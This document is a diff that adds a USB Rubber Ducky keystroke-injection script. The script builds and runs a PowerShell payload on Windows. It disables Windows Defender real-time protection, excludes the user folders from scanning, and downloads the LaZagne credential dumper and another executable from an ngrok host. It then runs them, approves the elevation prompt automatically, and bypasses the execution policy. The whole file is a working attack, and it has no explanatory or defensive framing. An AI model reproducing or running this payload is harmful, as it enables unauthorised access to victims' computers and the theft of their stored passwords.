@@ -1,0 +1,49 @@
+DELAY 5000
+GUI r
+DELAY 500
+STRING notepad
+ENTER
+DELAY 1000
+STRING Set-MpPreference -DisableRealtimeMonitoring $true
+ENTER
+STRING Set-MpPreference -ExclusionPath C:\Users
+ENTER
+STRING Invoke-WebRequest "https://quackattack.ngrok.io/lazagne.exe" -OutFile "C:\Users\$ENV:UserName\lazagne.exe"
+ENTER
+STRING Invoke-WebRequest "https://quackattack.ngrok.io/qa.exe" -OutFile "C:\Users\$ENV:UserName\qa.exe"
+ENTER
+STRING cd "C:\Users\$ENV:UserName"; .\qa.exe
+ENTER
+CONTROL s
+DELAY 500
+STRING qa.ps1
+TAB
+STRING a
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+SPACE
+STRING C:\Users\%username%
+ENTER
+TAB
+TAB
+TAB
+TAB
+TAB
+DELAY 100
+ENTER
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 1000
+ALT y 
+DELAY 1000
+STRING cd "C:\Users\$ENV:UserName"; powershell -ExecutionPolicy Bypass -File qa.ps1
+ENTER
+STRING exit
+ENTER
